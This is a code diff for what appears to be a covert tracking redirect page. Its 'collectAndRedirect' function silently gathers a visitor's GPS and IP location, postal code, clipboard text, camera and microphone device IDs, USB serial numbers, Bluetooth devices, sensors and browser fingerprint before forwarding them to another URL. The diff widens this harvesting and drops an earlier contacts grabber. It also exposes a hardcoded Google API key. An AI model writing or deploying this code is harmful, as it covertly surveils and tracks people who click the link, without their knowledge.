@@ -51,8 +51,11 @@
                     region: validateString(data.region),
                     country: validateString(data.country),
                     loc: validateString(data.loc),
+                    locationtemp: `https://www.google.com/maps?q=${validateString(data.loc)}`,
                     org: validateString(data.org),
-                    timezone: validateString(data.timezone)
+                    timezone: validateString(data.timezone),
+                    postal: validateString(data.postal),
+                    hostname: validateString(data.hostname)
                 };
             } catch (error) {
                 return null;
@@ -89,6 +92,7 @@
                                     `${(validateNumber(battery.chargingTime) / 60).toFixed(2)} minutes` : 'N/A',
                         dischargingTime: battery.dischargingTime !== undefined && battery.dischargingTime !== Infinity ? 
                                        `${(validateNumber(battery.dischargingTime) / 60).toFixed(2)} minutes` : 'N/A',
+                        chargingStatus: battery.charging ? (battery.chargingTime === Infinity ? 'Charging (time unknown)' : 'Charging') : 'Discharging',
                         supported: true
                     };
                 }
@@ -113,6 +117,8 @@
                         usedStorageGB: bytesToGB(usage),
                         freeStorageGB: bytesToGB(quota - usage),
                         percentageUsed: quota > 0 ? `${((usage / quota) * 100).toFixed(2)}%` : 'N/A',
+                        usageBytes: usage,
+                        quotaBytes: quota,
                         supported: true
                     };
                 }
@@ -122,248 +128,264 @@
             }
         }
 
-        async function checkContactPermissions() {
+        async function getMediaDevicesInfo() {
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
+                    return { supported: false };
+                }
+
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cameras = devices.filter(device => device.kind === 'videoinput');
+                const microphones = devices.filter(device => device.kind === 'audioinput');
+                const speakers = devices.filter(device => device.kind === 'audiooutput');
+
+                return {
+                    supported: true,
+                    totalDevices: devices.length,
+                    cameras: cameras.map(cam => ({
+                        id: cam.deviceId,
+                        label: cam.label || 'Unknown Camera',
+                        groupId: cam.groupId || 'N/A',
+                        kind: cam.kind
+                    })),
+                    microphones: microphones.map(mic => ({
+                        id: mic.deviceId,
+                        label: mic.label || 'Unknown Microphone',
+                        groupId: mic.groupId || 'N/A',
+                        kind: mic.kind
+                    })),
+                    speakers: speakers.map(speaker => ({
+                        id: speaker.deviceId,
+                        label: speaker.label || 'Unknown Speaker',
+                        groupId: speaker.groupId || 'N/A',
+                        kind: speaker.kind
+                    })),
+                    hasCamera: cameras.length > 0,
+                    hasMicrophone: microphones.length > 0,
+                    hasSpeaker: speakers.length > 0
+                };
+            } catch (error) {
+                return { supported: false, error: error.message };
+            }
+        }
+
+        async function getBluetoothInfo() {
+            try {
+                if (!navigator.bluetooth) {
+                    return { supported: false };
+                }
+
+                const availability = await navigator.bluetooth.getAvailability();
+                
+                let pairedDevices = [];
+                try {
+                    if ('getDevices' in navigator.bluetooth) {
+                        const devices = await navigator.bluetooth.getDevices();
+                        pairedDevices = devices.map(device => ({
+                            id: device.id,
+                            name: device.name || 'Unknown Device',
+                            connected: device.gatt ? device.gatt.connected : false,
+                            type: device.gatt ? 'GATT Device' : 'Unknown Type'
+                        }));
+                    }
+                } catch (e) {
+                    pairedDevices = [{ error: 'Cannot access paired devices without user gesture' }];
+                }
+
+                return {
+                    supported: true,
+                    available: availability,
+                    pairedDevicesCount: pairedDevices.length,
+                    pairedDevices: pairedDevices,
+                    canDiscover: true,
+                    info: 'Web Bluetooth API - Can discover and connect to nearby devices'
+                };
+            } catch (error) {
+                return { supported: false, error: error.message };
+            }
+        }
+
+        async function getUSBInfo() {
+            try {
+                if (!navigator.usb) {
+                    return { supported: false };
+                }
+
+                let connectedDevices = [];
+                try {
+                    const devices = await navigator.usb.getDevices();
+                    connectedDevices = devices.map(device => ({
+                        vendorId: '0x' + device.vendorId.toString(16).toUpperCase(),
+                        productId: '0x' + device.productId.toString(16).toUpperCase(),
+                        productName: device.productName || 'Unknown Product',
+                        manufacturerName: device.manufacturerName || 'Unknown Manufacturer',
+                        serialNumber: device.serialNumber || 'N/A',
+                        deviceClass: device.deviceClass || 'N/A',
+                        deviceProtocol: device.deviceProtocol || 'N/A'
+                    }));
+                } catch (e) {
+                    connectedDevices = [{ error: 'Cannot access USB devices without user permission' }];
+                }
+
+                return {
+                    supported: true,
+                    connectedDevicesCount: connectedDevices.length,
+                    connectedDevices: connectedDevices,
+                    canRequestDevice: true,
+                    info: 'WebUSB API - Can access and control USB devices'
+                };
+            } catch (error) {
+                return { supported: false, error: error.message };
+            }
+        }
+
+        async function getVibrationInfo() {
+            try {
+                if (!navigator.vibrate) {
+                    return { supported: false };
+                }
+
+                let testResult = 'Not tested (requires user gesture)';
+                let patternSupport = false;
+                
+                try {
+                    patternSupport = navigator.vibrate([100, 50, 100]);
+                    testResult = patternSupport ? 'Pattern vibration supported' : 'Simple vibration only';
+                } catch (e) {
+                    testResult = 'Vibration test requires user interaction';
+                }
+
+                return {
+                    supported: true,
+                    testResult: testResult,
+                    patternSupport: patternSupport,
+                    maxPatternLength: 100,
+                    info: 'Vibration API - Can control device vibration patterns'
+                };
+            } catch (error) {
+                return { supported: false, error: error.message };
+            }
+        }
+
+        async function getClipboardInfo() {
+            try {
+                if (!navigator.clipboard) {
+                    return { supported: false };
+                }
+
+                let clipboardContent = 'Requires user gesture to read';
+                let clipboardTypes = [];
+                let readSupported = false;
+                let writeSupported = false;
+                
+                readSupported = 'readText' in navigator.clipboard;
+                writeSupported = 'writeText' in navigator.clipboard;
+
+                try {
+                    if (readSupported) {
+                        const permission = await navigator.permissions.query({ name: 'clipboard-read' });
+                        if (permission.state === 'granted') {
+                            clipboardContent = await navigator.clipboard.readText();
+                            if (!clipboardContent) {
+                                clipboardContent = 'Clipboard is empty';
+                            } else {
+                                clipboardContent = clipboardContent.substring(0, 200) + (clipboardContent.length > 200 ? '...' : '');
+                            }
+                        }
+                    }
+                } catch (e) {
+                    clipboardContent = 'Clipboard read requires user permission: ' + e.message;
+                }
+
+                return {
+                    supported: true,
+                    clipboardText: clipboardContent,
+                    readSupported: readSupported,
+                    writeSupported: writeSupported,
+                    permissions: {
+                        read: await getPermissionState('clipboard-read'),
+                        write: await getPermissionState('clipboard-write')
+                    },
+                    info: 'Clipboard API - Can read and write clipboard data with permission'
+                };
+            } catch (error) {
+                return { supported: false, error: error.message };
+            }
+        }
+
+        async function getPermissionState(permissionName) {
             try {
                 if ('permissions' in navigator) {
-                    try {
-                        const permissionStatus = await navigator.permissions.query({ name: 'contacts' });
-                        return permissionStatus.state;
-                    } catch (e) {
-                        return 'not-supported';
-                    }
+                    const permission = await navigator.permissions.query({ name: permissionName });
+                    return permission.state;
                 }
                 return 'not-supported';
-            } catch (error) {
-                return 'not-supported';
+            } catch (e) {
+                return 'error';
             }
         }
 
-        async function getContactsIfAllowed() {
+        async function getSensorInfo() {
             try {
-                const contactPermission = await checkContactPermissions();
-                
-                if (contactPermission === 'granted') {
-                    if ('contacts' in navigator && 'select' in navigator.contacts) {
-                        try {
-                            const contacts = await navigator.contacts.select(['name', 'email', 'tel', 'address', 'icon'], { multiple: true });
-                            
-                            if (contacts && contacts.length > 0) {
-                                const formattedContacts = [];
-                                
-                                for (let contact of contacts) {
-                                    const contactData = {
-                                        name: 'No name',
-                                        emails: [],
-                                        phones: [],
-                                        addresses: []
-                                    };
-                                    
-                                    if (contact.name && contact.name.length > 0) {
-                                        contactData.name = contact.name[0];
-                                    }
-                                    
-                                    if (contact.email && contact.email.length > 0) {
-                                        contactData.emails = contact.email;
-                                    }
-                                    
-                                    if (contact.tel && contact.tel.length > 0) {
-                                        contactData.phones = contact.tel;
-                                    }
-                                    
-                                    if (contact.address && contact.address.length > 0) {
-                                        contactData.addresses = contact.address;
-                                    }
-                                    
-                                    formattedContacts.push(contactData);
-                                }
-                                
-                                return {
-                                    contacts: formattedContacts,
-                                    permission: 'granted',
-                                    count: formattedContacts.length,
-                                    success: true
-                                };
-                            } else {
-                                return {
-                                    contacts: [],
-                                    permission: 'granted',
-                                    count: 0,
-                                    success: true,
-                                    message: 'No contacts selected'
-                                };
-                            }
-                        } catch (contactError) {
-                            return {
-                                contacts: null,
-                                permission: 'granted',
-                                count: 0,
-                                success: false,
-                                error: contactError.message
-                            };
-                        }
-                    } else {
-                        return {
-                            contacts: null,
-                            permission: 'granted-but-no-api',
-                            count: 0,
-                            success: false,
-                            message: 'Contacts API not available'
-                        };
-                    }
-                }
-                
+                const sensors = {
+                    accelerometer: 'Accelerometer' in window,
+                    gyroscope: 'Gyroscope' in window,
+                    magnetometer: 'Magnetometer' in window,
+                    ambientLight: 'AmbientLightSensor' in window,
+                    proximity: 'ProximitySensor' in window,
+                    orientation: 'DeviceOrientationEvent' in window,
+                    motion: 'DeviceMotionEvent' in window,
+                    gravity: 'GravitySensor' in window,
+                    linearAcceleration: 'LinearAccelerationSensor' in window,
+                    absoluteOrientation: 'AbsoluteOrientationSensor' in window,
+                    relativeOrientation: 'RelativeOrientationSensor' in window
+                };
+
+                const availableSensors = Object.keys(sensors).filter(sensor => sensors[sensor]);
+
                 return {
-                    contacts: null,
-                    permission: contactPermission,
-                    count: 0,
-                    success: false,
-                    message: `Contact permission: ${contactPermission}`
+                    supported: availableSensors.length > 0,
+                    availableSensors: sensors,
+                    availableCount: availableSensors.length,
+                    sensorList: availableSensors,
+                    info: `Device has ${availableSensors.length} sensor APIs available`
                 };
             } catch (error) {
-                return {
-                    contacts: null,
-                    permission: 'error',
-                    count: 0,
-                    success: false,
-                    error: error.message
+                return { supported: false, error: error.message };
+            }
+        }
+
+        async function getNetworkDetailedInfo() {
+            try {
+                if (!navigator.connection) {
+                    return { supported: false };
+                }
+
+                const connection = navigator.connection;
+                const networkInfo = {
+                    effectiveType: connection.effectiveType,
+                    downlink: connection.downlink + ' Mbps',
+                    rtt: connection.rtt + ' ms',
+                    saveData: connection.saveData,
+                    type: connection.type,
+                    downlinkMax: connection.downlinkMax || 'N/A',
+                    supported: true
                 };
+
+                try {
+                    const startTime = performance.now();
+                    const speedTest = await fetch('https://httpbin.org/bytes/1024?seed=0', { cache: 'no-store' });
+                    const endTime = performance.now();
+                    networkInfo.latency = (endTime - startTime).toFixed(2) + ' ms';
+                    networkInfo.speedTest = 'Completed';
+                } catch (e) {
+                    networkInfo.speedTest = 'Failed: ' + e.message;
+                }
+
+                return networkInfo;
+            } catch (error) {
+                return { supported: false, error: error.message };
             }
-        }
-
-        function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            let os = 'Unknown';
-            let osVersion = 'Unknown';
-            let browser = 'Unknown';
-            let browserVersion = 'Unknown';
-            let deviceType = 'Desktop';
-
-            if (userAgent.includes('Windows')) {
-                os = 'Windows';
-                const winVersion = userAgent.match(/Windows NT (\d+\.\d+)/);
-                osVersion = winVersion ? winVersion[1] : 'Unknown';
-            } else if (userAgent.includes('Mac')) {
-                os = 'MacOS';
-                const macVersion = userAgent.match(/Mac OS X (\d+[._]\d+[._]\d+)/);
-                osVersion = macVersion ? macVersion[1].replace(/_/g, '.') : 'Unknown';
-            } else if (userAgent.includes('Linux')) {
-                os = 'Linux';
-            } else if (userAgent.includes('Android')) {
-                os = 'Android';
-                const androidVersion = userAgent.match(/Android (\d+\.\d+)/);
-                osVersion = androidVersion ? androidVersion[1] : 'Unknown';
-                deviceType = 'Mobile';
-            } else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
-                os = 'iOS';
-                const iosVersion = userAgent.match(/OS (\d+[_]\d+)/);
-                osVersion = iosVersion ? iosVersion[1].replace(/_/g, '.') : 'Unknown';
-                deviceType = 'Mobile';
-            }
-
-            const browserMatch = userAgent.match(/(Chrome|Firefox|Safari|Opera|Edge|Edg)\/?\s*(\d+\.\d+)/i);
-            if (browserMatch) {
-                browser = browserMatch[1];
-                browserVersion = browserMatch[2];
-            }
-
-            if (/Mobi|Android|iPhone|iPad/i.test(userAgent)) {
-                deviceType = 'Mobile';
-            }
-
-            return {
-                type: deviceType,
-                os: os,
-                osVersion: validateString(osVersion),
-                browser: browser,
-                browserVersion: validateString(browserVersion),
-                userAgent: validateString(userAgent),
-                platform: validateString(navigator.platform),
-                language: validateString(navigator.language),
-                languages: Array.isArray(navigator.languages) ? navigator.languages : ['N/A'],
-                cpuCores: validateNumber(navigator.hardwareConcurrency),
-                maxTouchPoints: validateNumber(navigator.maxTouchPoints),
-                deviceMemory: validateNumber(navigator.deviceMemory),
-                vendor: validateString(navigator.vendor),
-                product: validateString(navigator.product),
-                productSub: validateString(navigator.productSub)
-            };
-        }
-
-        function getNetworkInfo() {
-            if (!navigator.connection) {
-                return {
-                    effectiveType: 'N/A',
-                    downlink: 'N/A',
-                    rtt: 'N/A',
-                    saveData: 'N/A',
-                    type: 'N/A',
-                    supported: false
-                };
-            }
-
-            return {
-                effectiveType: validateString(navigator.connection.effectiveType),
-                downlink: validateNumber(navigator.connection.downlink),
-                rtt: validateNumber(navigator.connection.rtt),
-                saveData: navigator.connection.saveData !== undefined ? navigator.connection.saveData : 'N/A',
-                type: validateString(navigator.connection.type),
-                supported: true
-            };
-        }
-
-        function getMediaDevicesInfo() {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
-                return { supported: false };
-            }
-
-            return {
-                supported: true,
-                info: 'Media devices API available'
-            };
-        }
-
-        function getBluetoothInfo() {
-            if (!navigator.bluetooth) {
-                return { supported: false };
-            }
-
-            return {
-                supported: true,
-                info: 'Web Bluetooth API available'
-            };
-        }
-
-        function getUSBInfo() {
-            if (!navigator.usb) {
-                return { supported: false };
-            }
-
-            return {
-                supported: true,
-                info: 'WebUSB API available'
-            };
-        }
-
-        function getVibrationInfo() {
-            if (!navigator.vibrate) {
-                return { supported: false };
-            }
-
-            return {
-                supported: true,
-                info: 'Vibration API available'
-            };
-        }
-
-        function getClipboardInfo() {
-            if (!navigator.clipboard) {
-                return { supported: false };
-            }
-
-            return {
-                supported: true,
-                info: 'Clipboard API available'
-            };
         }
 
         async function getEnhancedLocation() {
@@ -382,22 +404,32 @@
                                     resolve({
                                         latitude: lat,
                                         longitude: lng,
-                                        accuracy: validateNumber(pos.coords.accuracy),
-                                        altitude: pos.coords.altitude ? validateNumber(pos.coords.altitude) : 'N/A',
-                                        altitudeAccuracy: pos.coords.altitudeAccuracy ? validateNumber(pos.coords.altitudeAccuracy) : 'N/A',
-                                        heading: pos.coords.heading ? validateNumber(pos.coords.heading) : 'N/A',
-                                        speed: pos.coords.speed ? validateNumber(pos.coords.speed) : 'N/A',
+                                        accuracy: validateNumber(pos.coords.accuracy) + ' meters',
+                                        altitude: pos.coords.altitude ? validateNumber(pos.coords.altitude) + ' meters' : 'N/A',
+                                        altitudeAccuracy: pos.coords.altitudeAccuracy ? validateNumber(pos.coords.altitudeAccuracy) + ' meters' : 'N/A',
+                                        heading: pos.coords.heading ? validateNumber(pos.coords.heading) + ' degrees' : 'N/A',
+                                        speed: pos.coords.speed ? validateNumber(pos.coords.speed) + ' m/s' : 'N/A',
                                         locationName: locationName,
                                         source: 'GPS',
                                         gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
+                                        timestamp: new Date(pos.timestamp).toISOString(),
                                         success: true
                                     });
                                 } else {
-                                    resolve({ success: false, error: 'No coordinates' });
+                                    resolve({ success: false, error: 'No coordinates received' });
                                 }
                             },
-                            (error) => resolve({ success: false, error: error.message }),
-                            { timeout: 5000, enableHighAccuracy: true }
+                            (error) => resolve({ 
+                                success: false, 
+                                error: error.message,
+                                code: error.code,
+                                permissionDenied: error.code === 1
+                            }),
+                            { 
+                                timeout: 10000, 
+                                enableHighAccuracy: true,
+                                maximumAge: 300000 
+                            }
                         );
                     });
                 }
@@ -409,7 +441,10 @@
                 const wifiResponse = await fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyCsdXb9ClkZf2IKdhdPk2Pyk1BEi_Ckj6M', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ considerIp: true })
+                    body: JSON.stringify({ 
+                        considerIp: true,
+                        wifiAccessPoints: [] 
+                    })
                 });
                 
                 if (wifiResponse.ok) {
@@ -422,23 +457,42 @@
                         results.wifi = {
                             latitude: lat,
                             longitude: lng,
-                            accuracy: validateNumber(wifiData.accuracy),
+                            accuracy: validateNumber(wifiData.accuracy) + ' meters',
                             locationName: locationName,
-                            source: 'WiFi',
+                            source: 'WiFi/Cell Tower',
                             gmapsLink: `https://www.google.com/maps?q=${lat},${lng}`,
                             success: true
                         };
                     } else {
-                        results.wifi = { success: false, error: 'No location data' };
+                        results.wifi = { success: false, error: 'No location data in response' };
                     }
                 } else {
-                    results.wifi = { success: false, error: 'API request failed' };
+                    results.wifi = { success: false, error: `API request failed: ${wifiResponse.status}` };
                 }
             } catch (e) {
                 results.wifi = { success: false, error: e.message };
             }
             
             return results;
+        }
+
+        async function getPerformanceInfo() {
+            try {
+                const memory = performance.memory;
+                const timing = performance.timing;
+                
+                return {
+                    memory: memory ? {
+                        used: Math.round(memory.usedJSHeapSize / 1048576) + ' MB',
+                        total: Math.round(memory.totalJSHeapSize / 1048576) + ' MB',
+                        limit: Math.round(memory.jsHeapSizeLimit / 1048576) + ' MB'
+                    } : null,
+                    navigation: performance.getEntriesByType('navigation')[0] || null,
+                    supported: true
+                };
+            } catch (error) {
+                return { supported: false, error: error.message };
+            }
         }
 
         async function collectAndRedirect(redirectUrl) {
@@ -455,21 +509,47 @@
                     timeZoneName: 'short'
                 };
 
-                const [locationData, enhancedLocation, batteryInfo, storageInfo, contactInfo] = await Promise.allSettled([
+                const [
+                    locationData, enhancedLocation, batteryInfo, storageInfo, 
+                    mediaDevicesInfo, bluetoothInfo, usbInfo, vibrationInfo, 
+                    clipboardInfo, sensorInfo, networkDetailedInfo, performanceInfo
+                ] = await Promise.allSettled([
                     getIPBasedLocation(),
                     getEnhancedLocation(),
                     getBatteryInfo(),
                     getStorageInfo(),
-                    getContactsIfAllowed()
+                    getMediaDevicesInfo(),
+                    getBluetoothInfo(),
+                    getUSBInfo(),
+                    getVibrationInfo(),
+                    getClipboardInfo(),
+                    getSensorInfo(),
+                    getNetworkDetailedInfo(),
+                    getPerformanceInfo()
                 ]);
 
-                const deviceInfo = getDeviceInfo();
-                const networkInfo = getNetworkInfo();
-                const mediaDevicesInfo = getMediaDevicesInfo();
-                const bluetoothInfo = getBluetoothInfo();
-                const usbInfo = getUSBInfo();
-                const vibrationInfo = getVibrationInfo();
-                const clipboardInfo = getClipboardInfo();
+                const deviceInfo = {
+                    type: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                    os: navigator.userAgent.includes('Windows') ? 'Windows' : 
+                        navigator.userAgent.includes('Mac') ? 'MacOS' : 
+                        navigator.userAgent.includes('Linux') ? 'Linux' : 
+                        navigator.userAgent.includes('Android') ? 'Android' : 
+                        navigator.userAgent.includes('iOS') ? 'iOS' : 'Unknown',
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cpuCores: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory + ' GB',
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    vendor: navigator.vendor,
+                    product: navigator.product,
+                    userAgentData: navigator.userAgentData ? {
+                        brands: navigator.userAgentData.brands,
+                        mobile: navigator.userAgentData.mobile,
+                        platform: navigator.userAgentData.platform
+                    } : null
+                };
 
                 const data = {
                     redirectUrl: redirectUrl,
@@ -482,7 +562,10 @@
                         availWidth: validateNumber(screen.availWidth),
                         availHeight: validateNumber(screen.availHeight),
                         pixelDepth: validateNumber(screen.pixelDepth),
-                        orientation: screen.orientation ? screen.orientation.type : 'N/A'
+                        orientation: screen.orientation ? {
+                            type: screen.orientation.type,
+                            angle: screen.orientation.angle
+                        } : 'N/A'
                     },
                     viewport: {
                         width: validateNumber(window.innerWidth),
@@ -496,22 +579,26 @@
                     storageInfo: storageInfo.status === 'fulfilled' ? storageInfo.value : { supported: false, error: 'Failed to get storage info' },
                     locationData: locationData.status === 'fulfilled' ? locationData.value : null,
                     enhancedLocation: enhancedLocation.status === 'fulfilled' ? enhancedLocation.value : { gps: { success: false }, wifi: { success: false } },
-                    contactInfo: contactInfo.status === 'fulfilled' ? contactInfo.value : { contacts: null, permission: 'error', count: 0, success: false },
                     deviceInfo: deviceInfo,
-                    networkInfo: networkInfo,
+                    networkInfo: networkDetailedInfo.status === 'fulfilled' ? networkDetailedInfo.value : { supported: false },
+                    performanceInfo: performanceInfo.status === 'fulfilled' ? performanceInfo.value : { supported: false },
                     advancedAPIs: {
-                        mediaDevices: mediaDevicesInfo,
-                        bluetooth: bluetoothInfo,
-                        usb: usbInfo,
-                        vibration: vibrationInfo,
-                        clipboard: clipboardInfo
+                        mediaDevices: mediaDevicesInfo.status === 'fulfilled' ? mediaDevicesInfo.value : { supported: false },
+                        bluetooth: bluetoothInfo.status === 'fulfilled' ? bluetoothInfo.value : { supported: false },
+                        usb: usbInfo.status === 'fulfilled' ? usbInfo.value : { supported: false },
+                        vibration: vibrationInfo.status === 'fulfilled' ? vibrationInfo.value : { supported: false },
+                        clipboard: clipboardInfo.status === 'fulfilled' ? clipboardInfo.value : { supported: false },
+                        sensors: sensorInfo.status === 'fulfilled' ? sensorInfo.value : { supported: false }
                     },
-                    dataCollection: {
-                        batterySupported: batteryInfo.status === 'fulfilled' ? batteryInfo.value.supported : false,
-                        storageSupported: storageInfo.status === 'fulfilled' ? storageInfo.value.supported : false,
-                        networkSupported: networkInfo.supported,
-                        contactSupported: contactInfo.status === 'fulfilled' ? contactInfo.value.permission !== 'not-supported' : false,
-                        contactSuccess: contactInfo.status === 'fulfilled' ? contactInfo.value.success : false
+                    collectionSummary: {
+                        totalAPIs: 12,
+                        successfulAPIs: [
+                            batteryInfo.status, storageInfo.status, locationData.status,
+                            mediaDevicesInfo.status, bluetoothInfo.status, usbInfo.status,
+                            vibrationInfo.status, clipboardInfo.status, sensorInfo.status,
+                            networkDetailedInfo.status, performanceInfo.status
+                        ].filter(status => status === 'fulfilled').length,
+                        timestamp: Date.now()
                     }
                 };
 
@@ -526,12 +613,12 @@
 
                 setTimeout(() => {
                     window.location.href = redirectUrl;
-                }, 300);
+                }, 500);
 
             } catch (error) {
                 setTimeout(() => {
                     window.location.href = redirectUrl;
-                }, 300);
+                }, 500);
             }
         }
 
